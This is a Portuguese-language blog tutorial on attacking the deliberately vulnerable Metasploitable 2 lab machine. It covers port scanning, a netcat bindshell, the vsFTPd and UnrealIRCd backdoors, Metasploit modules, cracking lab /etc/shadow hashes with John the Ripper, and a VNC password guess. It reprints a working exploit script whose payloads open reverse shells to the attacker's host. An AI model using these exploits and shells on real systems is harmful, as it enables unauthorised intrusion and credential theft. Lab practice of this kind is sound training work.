---
title: "Exploração de vulnerabilidades em ambientes virtuais"
date: 2024-08-11
published: 2024-08-11
description: "Exploração de vulnerabilidades da máquina Metasploitable 2"
categories:
  - "Easy"
tags:
  - "Redes"
images: []
author: "brenoppr"
---

## Introdução

Neste post, vamos abordar como identificar e explorar algumas vulnerabilidades comuns encontradas na máquina vulnerável Metasploitable 2, utilizando ferramentas e métodos que são amplamente aplicáveis em cenários reais.

## O que é o Metasploitable 2?

Metasploitable 2 é uma máquina virtual intencionalmente vulnerável, desenvolvida pela Rapid7, projetada para ser uma plataforma de prática para profissionais e entusiastas de segurança cibernética. Ela simula um ambiente de rede com várias vulnerabilidades conhecidas, permitindo que os usuários testem e aprimorem suas habilidades em pentest sem comprometer sistemas reais. 

Essa máquina contém diversos serviços mal configurados e softwares desatualizados, representando um campo de treino ideal para aprender a identificar e explorar falhas de segurança de forma controlada.

![Figura 1](/images/gabriel-breno-post-metasploitable2/metasploitablehome.png)

**Figura 1:** Metasploitable 2 sendo executado em uma Máquina Virtual.

Um guia para a instalação do ambiente do Metasploitable 2 pode ser encontrado [aqui](https://docs.rapid7.com/metasploit/metasploitable-2/).

## Exploração inicial: Enumeração de portas

A exploração inicial de qualquer sistema vulnerável começa com a enumeração de portas, uma etapa essencial para identificar quais serviços estão em execução e, potencialmente, vulneráveis. Para isso, utilizamos o Nmap (Network Mapper), uma ferramenta poderosa e amplamente utilizada em testes de penetração. O Nmap permite mapear a rede e descobrir portas abertas, além de coletar informações detalhadas sobre os serviços, versões e sistemas operacionais em execução. 

Essas informações são cruciais para planejar as etapas subsequentes da exploração, pois ajudam a direcionar os esforços para vulnerabilidades específicas que podem ser exploradas com sucesso.

![Figura 2](/images/gabriel-breno-post-metasploitable2/nmap.png)

**Figura 2:** O comando Nmap é usado para descobrir quais serviços estão rodando em quais portas no IP da máquina vulnerável.

Podemos ver diversas portas abertas, cada uma com um serviço diferente que pode ou não ser vulnerável. Neste post, não abordaremos todas as vulnerabilidades, mas podemos imediatemente abordar algumas que nos saltam aos olhos.

## Bindshell

A porta 1524 aberta na Metasploitable 2 representa uma vulnerabilidade crítica, conhecida como "bindshell". Essa vulnerabilidade ocorre quando um shell é vinculado diretamente a uma porta, permitindo que qualquer atacante que se conecte a essa porta obtenha acesso ao sistema com privilégios elevados, sem a necessidade de autenticação. 

Podemos explorá-la utilizando o comando nc (netcat) para conectar ao IP da máquina na porta 1524.

![Figura 3](/images/gabriel-breno-post-metasploitable2/bindshell.png)

**Figura 3:** O netcat é usado para se conectar ao IP da máquina vulnerável na porta 1524. O comando whoami mostra que nós de fato estamos executando código na máquina vulnerável como o usuário raiz (root).

## vsFTPd

Ao tentar se conectar ao serviço FTP na porta 21, podemos ver que ela está vinculada ao vsFTPd versão 2.3.4. Uma busca rápida no Google nos mostra que este serviço está sujeito a uma vulnerabilidade de backdoor ([CVE-2011-2523](https://www.exploit-db.com/exploits/49757)). 

Ao tentar logar com um nome de usuário finalizado em ":)", sem aspas, um shell é criado e passa a ser servido na porta 6200 com privilégios de administrador.

![Figura 4](/images/gabriel-breno-post-metasploitable2/vsftpd1.png)

**Figura 4:** Ao tentar se logar com o usuário terminado em :), a autenticação parece falhar. No entanto...

![Figura 5](/images/gabriel-breno-post-metasploitable2/vsftpd2.png)

**Figura 5:** Conseguimos nos conectar na porta 6200, muito similar à vulnerabilidade do bindshell vista anteriormente.

## UnrealIRCd

O serviço de IRC na porta 6667 é o UnrealIRCd versão 3.2.8.1. Isso pode ser checado com um script do Nmap para obter informações de serviços IRC.

![Figura 6](/images/gabriel-breno-post-metasploitable2/irc1.png)

**Figura 6:** Os scripts do Nmap podem nos ajudar a receber informações de serviços que seriam difíceis de conseguir de outras formas.

Ao pesquisar por esta versão, é possível novamente confirmar que ela é sujeita a uma vulnerabilidade backdoor como descrita no [CVE-2010-2075](https://www.exploit-db.com/exploits/16922), que permite injeção de comando na máquina vulnerável. No entanto, esta vulnerabilidade é um pouco mais complexa que a última, então para explorar ela usamos o seguinte [script](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py):

```
#!/usr/bin/python3
import argparse
import socket
import base64

# Sets the target ip and port from argparse
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='target ip')
parser.add_argument('port', help='target port', type=int)
parser.add_argument('-payload', help='set payload type', required=True, choices=['python', 'netcat', 'bash'])
args = parser.parse_args()

# Sets the local ip and port (address and port to listen on)
local_ip = ''  # CHANGE THIS
local_port = ''  # CHANGE THIS 

# The different types of payloads that are supported
python_payload = f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{local_ip}\';EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '
bash_payload = f'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'
netcat_payload = f'nc -e /bin/bash {local_ip} {local_port}'

# our socket to interact with and send payload
try:
    s = socket.create_connection((args.ip, args.port))
except socket.error as error:
    print('connection to target failed...')
    print(error)
    
# craft out payload and then it gets base64 encoded
def gen_payload(payload_type):
    base = base64.b64encode(payload_type.encode())
    return f'echo {base.decode()} |base64 -d|/bin/bash'

# all the different payload options to be sent
if args.payload == 'python':
    try:
        s.sendall((f'AB; {gen_payload(python_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')

if args.payload == 'netcat':
    try:
        s.sendall((f'AB; {gen_payload(netcat_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')

if args.payload == 'bash':
    try:
        s.sendall((f'AB; {gen_payload(bash_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
    
#check display any response from the server
data = s.recv(1024)
s.close()
if data != '':
    print('Exploit sent successfully!')
```

Este script enviará para o IP da máquina vulnerável um comando para conectá-la à nossa na porta especificada (no caso, definimos no script como 7777). Para receber esse sinal, podemos usar o próprio netcat, usado anteriormente, para criar um servidor que escuta por requisições na nossa porta 7777. 

Ao receber essa conexão, imediatamente temos acesso ao shell da máquina vulnerável, novamente como usuário root.

![Figura 7](/images/gabriel-breno-post-metasploitable2/irc2.png)

**Figura 7:** O script se conecta à maquina vulnerável e a faz criar uma requisição para nossa porta 7777.

![Figura 8](/images/gabriel-breno-post-metasploitable2/irc3.png)

**Figura 8:** Ao receber a requisição, nosso servidor passa para o modo interativo e conseguimos acesso ao shell remoto.


## Introdução ao Metasploit: Explorando Serviços Vulneráveis

Até o momento, utilizamos diversas ferramentas para mapear e interagir com os serviços ativos na máquina. Embora essas ferramentas individuais sejam poderosas, há um framework que consolida várias dessas capacidades em uma única plataforma: o Metasploit, que contém centenas de módulos para exploração de vulnerabilidades.

A seguir, vamos explorar alguns módulos que lidam com servidores FTP vulneráveis para verificar se o serviço FTP que encontramos permite acesso anônimo, um vetor de ataque comum em sistemas mal configurados.

## Anonymous FTP Login

Neste tutorial, usaremos o Metasploit para explorar uma vulnerabilidade conhecida em um servidor FTP e obter informações sobre as senhas dos usuários.

Para começar, você precisa abrir o Metasploit. Se estiver usando o Kali Linux, o Metasploit já vem pré-instalado. Basta abrir um terminal e digitar o seguinte comando para iniciá-lo:

```bash
└─$ msfconsole
```

Se estiver usando outra distribuição Linux, você pode consultar a documentação do Metasploit no seguinte link: https://docs.metasploit.com/.

O primeiro módulo que usaremos é o scanner/ftp/anonymous, que verifica se o servidor FTP permite acesso anônimo. Digite os seguintes comandos no prompt do Metasploit:

```bash
└─$ msf6 > use auxiliary/scanner/ftp/anonymous
```

Em seguida, configure o endereço IP do alvo. 

_Observação: o IP da sua máquina Metasploitable 2 pode ser diferente deste abaixo. Para consultá-lo, entre em sua máquina virtual, digite o comando `ip a` no terminal e procure pelo endereço IP associado à interface eth0._

```bash
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30
```

Agora, execute o scanner para verificar o acesso anônimo:

```bash
msf6 auxiliary(scanner/ftp/anonymous) > run

[+] 192.168.1.30:21       - 192.168.1.30:21 - Anonymous READ (220 (vsFTPd 2.3.4))
[*] 192.168.1.30:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Veja que o FTP permite login anônimo. Podemos, usar um exploit específico para uma vulnerabilidade conhecida no vsFTPd 2.3.4 (Very Secure FTP Daemon): o vsftpd_234_backdoor. Este módulo explora a vulnerabilidade do vsFTPd 2.3.4 para obter uma shell interativa. 

Para isso, digite os seguintes comandos:

```bash
msf6 auxiliary(scanner/ftp/anonymous) > use exploit/unix/ftp/vsftpd_234_backdoor

[*] No payload configured, defaulting to cmd/unix/interact
```

Configure o endereço IP do alvo e a porta (por padrão, o FTP usa a porta 21):

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
RPORT => 21
```

Agora, execute o exploit:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.1.30:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.30:21 - USER: 331 Please specify the password.
[+] 192.168.1.30:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.30:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (172.18.18.105:35943 -> 192.168.1.30:6200) at 2024-08-11 17:08:34 -0300
```
O exploit foi bem-sucedido. Agora, nós temos uma shell no sistema remoto como o usuário root e podemos explorar o sistema de arquivos do alvo. Por exemplo, veja o comando `dir` que lista as pastas do diretório atual (que é o `/`):

```bash
dir

bin    dev   initrd      lost+found  nohup.out  root  sys  var
boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz
cdrom  home  lib         mnt         proc       srv   usr
```

Podemos também procurar e baixar arquivos sensíveis como /etc/passwd e /etc/shadow, que contêm informações sobre os usuários e suas senhas. Vamos listar o conteúdo desses arquivos com o comando GET:

```bash
GET /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
```

```bash
GET /etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
```

Em posse dessas informações, uma ideia seria utilizar o John the Ripper, uma ferramenta de cracking de senhas que pode processar e quebrar hashes de senhas. Ela tem a capacidade de unificar arquivos de senha e hash, como o /etc/passwd e /etc/shadow, e realizar ataques para descobrir as senhas originais.

Para unificar esses arquivos e preparar o ambiente para quebrar as senhas, vamos baixar os arquivos e salvá-los em meu diretório local `/tmp` no Kali.

```bash
download /etc/passwd /tmp/passwd
[*] Download /etc/passwd => /tmp/passwd
[+] Done
```

```bash
download /etc/shadow /tmp/shadow
[*] Download /etc/shadow => /tmp/shadow
[+] Done
```

Vamos voltar para o terminal padrão do Kali.

```bash
exit
[*] 192.168.1.30 - Command shell session 2 closed.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exit

┌──(gbrods㉿Gabriel)-[~]
└─$
```

Com os arquivos baixados, usamos o comando `unshadow` do John the Ripper para combinar os arquivos /etc/passwd e /etc/shadow em um único arquivo de hashes `unshadowed.txt`.

```bash
└─$ unshadow /tmp/passwd /tmp/shadow > /tmp/unshadowed.txt
```

O arquivo unificado fica desta forma:

```bash
cat /tmp/unshadowed.txt
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
dhcp:*:101:102::/nonexistent:/bin/false
syslog:*:102:103::/home/syslog:/bin/false
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:*:105:113::/var/cache/bind:/bin/false
postfix:*:106:115::/var/spool/postfix:/bin/false
ftp:*:107:65534::/home/ftp:/bin/false
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:!:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:*:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:*:111:65534::/:/bin/false
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
telnetd:*:112:120::/nonexistent:/bin/false
proftpd:!:113:65534::/var/run/proftpd:/bin/false
statd:*:114:65534::/var/lib/nfs:/bin/false
```

Finalmente, use o John the Ripper para quebrar as senhas no arquivo unificado. O formato de saída é: `senha    (usuário)`

```bash
└─$ john /tmp/unshadowed.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
user             (user)
postgres         (postgres)
msfadmin         (msfadmin)
service          (service)
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
123456789        (klog)
batman           (sys)
Proceeding with incremental:ASCII

...

```

Depois que o comando terminar, podemos exibir os resultados da seguinte forma:

```bash
└─$ john --show /tmp/unshadowed.txt
sys:batman:3:3:sys:/dev:/bin/sh
klog:123456789:103:104::/home/klog:/bin/false
msfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
postgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
user:user:1001:1001:just a user,111,,:/home/user:/bin/bash
service:service:1002:1002:,,,:/home/service:/bin/bash

6 password hashes cracked, 1 left
```
Ao utilizar a wordlist `password.lst`, não foram encontradas outras senhas além daquelas obtidas anteriormente.

## VNC (Virtual Network Computing)

Relembrando da nossa enumeração inicial de portas, havia uma porta aberta referente ao serviço VNC. Veja:

```bash
└─$ nmap -sV 192.168.1.30 -p 5900
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 18:52 -03
Nmap scan report for 192.168.1.30
Host is up (0.0017s latency).

PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC (protocol 3.3)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```
_Observação: a flag `-sV` habilita a detecção de serviço, retornando informações sobre suas versões._

O VNC é um protocolo para controle remoto de desktops, e pode ser uma porta de entrada para obter acesso gráfico ao sistema. A seguir, vamos utilizar o Metasploit para tentar autenticar no serviço VNC.

```bash
msfconsole
```

Busque pelo módulo que testa credenciais de login para o VNC.

```bash
msf6 > search vnc_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/vnc/vnc_login  .                normal  No     VNC Authentication Scanner
```

Selecionamos o módulo para escaneamento de login do VNC.

```bash
msf6 > use auxiliary/scanner/vnc/vnc_login
```

Cada módulo do Metasploit possui campos obrigatórios e opcionais. Os campos obrigatórios são essenciais para a execução do módulo, enquanto os campos opcionais podem ser configurados para personalizar a execução ou otimizar o processo de exploração. Para ver esss campos, utilize o seguinte comando:

```bash
msf6 auxiliary(scanner/vnc/vnc_login) > show options

Module options (auxiliary/scanner/vnc/vnc_login):

   Name              Current Setting                  Required  Description
   ----              ---------------                  --------  -----------
   ANONYMOUS_LOGIN   false                            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                            no        Try each user/password couple stored in the current da
                                                                tabase
   DB_ALL_PASS       false                            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                             no        Skip existing credentials stored in the current databa
                                                                se (Accepted: none, user, user&realm)
   PASSWORD                                           no        The password to test
   PASS_FILE         /usr/share/metasploit-framework  no        File containing passwords, one per line
                     /data/wordlists/vnc_passwords.t
                     xt
   Proxies                                            no        A proxy chain of format type:host:port[,type:host:port
                                                                ][...]
   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/do
                                                                cs/using-metasploit/basics/using-metasploit.html
   RPORT             5900                             yes       The target port (TCP)
   STOP_ON_SUCCESS   false                            yes       Stop guessing when a credential works for a host
   THREADS           1                                yes       The number of concurrent threads (max one per host)
   USERNAME          <BLANK>                          no        A specific username to authenticate as
   USERPASS_FILE                                      no        File containing users and passwords separated by space
                                                                , one pair per line
   USER_AS_PASS      false                            no        Try the username as the password for all users
   USER_FILE                                          no        File containing usernames, one per line
   VERBOSE           true                             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```
Vamos configurar o endereço do host alvo e o nome de usuário.

```bash
msf6 auxiliary(scanner/vnc/vnc_login) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30

msf6 auxiliary(scanner/vnc/vnc_login) > set USERNAME root
USERNAME => root
```

Por fim, executamos o módulo para tentar a autenticação.

```bash
msf6 auxiliary(scanner/vnc/vnc_login) > run

[*] 192.168.1.30:5900     - 192.168.1.30:5900 - Starting VNC login sweep
[!] 192.168.1.30:5900     - No active DB -- Credential data will not be saved!
[+] 192.168.1.30:5900     - 192.168.1.30:5900 - Login Successful: :password
[*] 192.168.1.30:5900     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Vimos que o módulo conseguiu logar com sucesso usando a senha password. Abra outro terminal do Kali e utilize o comando `vncviewer 192.168.1.30`. Se o `vncviewer` não estiver instalado, você pode obtê-lo com o seguinte comando: `sudo apt install tigervnc-viewer`.

```bash
vncviewer 192.168.1.30
```

Insira a senha `password`, conforme encontramos anteriormente.

![Figura 9](/images/gabriel-breno-post-metasploitable2/login_vnc.png)

Dessa forma, é possível obter acesso completo ao desktop remoto, oferecendo uma oportunidade para explorar mais sobre a máquina-alvo.

![Figura 10](/images/gabriel-breno-post-metasploitable2/vnc_gui.png)

## Exploração de um servidor web

Anteriormente, encontramos que a porta 80 está aberta. Vamos analisá-la.

```bash
└─$ nmap -sV 192.168.1.30 -p 80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 19:51 -03
Nmap scan report for 192.168.1.30
Host is up (0.0077s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds
```

O servidor web está rodando o Apache HTTPD 2.2.8 em um sistema Ubuntu. Para obter mais informações sobre o servidor, podemos usar o seguinte módulo do Metasploit:

```bash
msf6 > search http_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/http_version  .                normal  No     HTTP Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/http_version
```

Selecionando o módulo de detecção de versão HTTP:

```bash
msf6 > use auxiliary/scanner/http/http_version
```

Exibindo as opções disponíveis para o módulo:

```bash
msf6 auxiliary(scanner/http/http_version) > show options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
                                       s/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host
```

Configurando o módulo com o endereço do alvo:

```bash
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30
```

Executamos o módulo para verificar a versão do HTTP:

```bash
msf6 auxiliary(scanner/http/http_version) > run

[+] 192.168.1.30:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

De fato, o servidor está rodando Apache/2.2.8 (Ubuntu), mas está rodando PHP/5.2.4-2ubuntu5.10. Agora que sabemos que o servidor está usando PHP, uma abordagem comum é verificar se existem arquivos de configuração padrão que podem fornecer informações úteis. Um arquivo típico para verificar é o phpinfo.php, que geralmente está disponível para fins de diagnóstico e fornece informações detalhadas sobre a configuração do PHP. 

Vamos acessar esse caminho no browser, navegando para o endereço `192.168.1.30/phpinfo.php`.

_Observação: o phpinfo.php é um caminho padrão, mas nem todos os servidores terão este arquivo disponível. Se não estiver acessível, é possível que o administrador do sistema tenha removido ou desativado esse arquivo por questões de segurança._

![Figura 11](/images/gabriel-breno-post-metasploitable2/phpinfo.png)

Vamos, agora, identificar diretórios no servidor web usando o seguinte módulo:

```bash
msf6 > search dir_scanner

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/dir_scanner  .                normal  No     HTTP Directory Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/dir_scanner
```

Selecionando o módulo:

```bash
msf6 > use auxiliary/scanner/http/dir_scanner
```

Mostrando as opções disponíveis:

```bash
msf6 auxiliary(scanner/http/dir_scanner) > show options

Module options (auxiliary/scanner/http/dir_scanner):

   Name        Current Setting                    Required  Description
   ----        ---------------                    --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/d  no        Path of word dictionary to use
               ata/wmap/wmap_dirs.txt
   PATH        /                                  yes       The path  to identify files
   Proxies                                        no        A proxy chain of format type:host:port[,type:host:port][..
                                                            .]
   RHOSTS                                         yes       The target host(s), see https://docs.metasploit.com/docs/u
                                                            sing-metasploit/basics/using-metasploit.html
   RPORT       80                                 yes       The target port (TCP)
   SSL         false                              no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                  yes       The number of concurrent threads (max one per host)
   VHOST                                          no        HTTP server virtual host
```

Configurando o alvo:

```bash
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30
```

Por fim, vamos executar o módulo.

```bash
msf6 auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 192.168.1.30
[+] Found http://192.168.1.30:80/cgi-bin/ 403 (192.168.1.30)
[+] Found http://192.168.1.30:80/doc/ 200 (192.168.1.30)
[+] Found http://192.168.1.30:80/icons/ 200 (192.168.1.30)
[+] Found http://192.168.1.30:80/index/ 200 (192.168.1.30)
[+] Found http://192.168.1.30:80/phpMyAdmin/ 200 (192.168.1.30)
[+] Found http://192.168.1.30:80/test/ 200 (192.168.1.30)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

O módulo retornou uma lista de diretórios, que podem conter informações sensíveis ou vulnerabilidades que podem ser exploradas. Um diretório interessante seria o `/phpMyAdmin/`. Vamos tentar explorá-lo utilizando o seguinte módulo de injeção de argumento CGI (Common Gateway Interface) no PHP.

```bash
msf6 > search php_cgi

Matching Modules
================

   #  Name                                                          Disclosure Date  Rank       Check  Description
   -  ----                                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/php_cgi_arg_injection                      2012-05-03       excellent  Yes    PHP CGI Argument Injection
   1  exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577  2024-06-06       excellent  Yes    PHP CGI Argument Injection Remote Code Execution
   2    \_ target: Windows PHP                                      .                .          .      .
   3    \_ target: Windows Command                                  .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command'
```

Vamos utilizar a opção `0`.

```bash
msf6 > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
```

Configurando o alvo:

```bash
msf6 exploit(multi/http/php_cgi_arg_injection) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30
```

Por fim, vamos executar o exploit.

```bash
msf6 exploit(multi/http/php_cgi_arg_injection) > exploit

[*] Started reverse TCP handler on 172.18.18.105:4444
[*] Exploit completed, but no session was created.
```

Infelizmente, o exploit falhou em minha máquina. De acordo com [este vídeo](https://www.youtube.com/watch?v=HH7DPfYTfoI), após injetar um argumento malicioso na solicitação CGI e explorar a vulnerabilidade no PHP, obteríamos um shell reverso na máquina alvo, permitindo controle remoto e acesso a informações. Veja um screenshot deste vídeo:

![Figura 12](/images/gabriel-breno-post-metasploitable2/exploit_php.png)

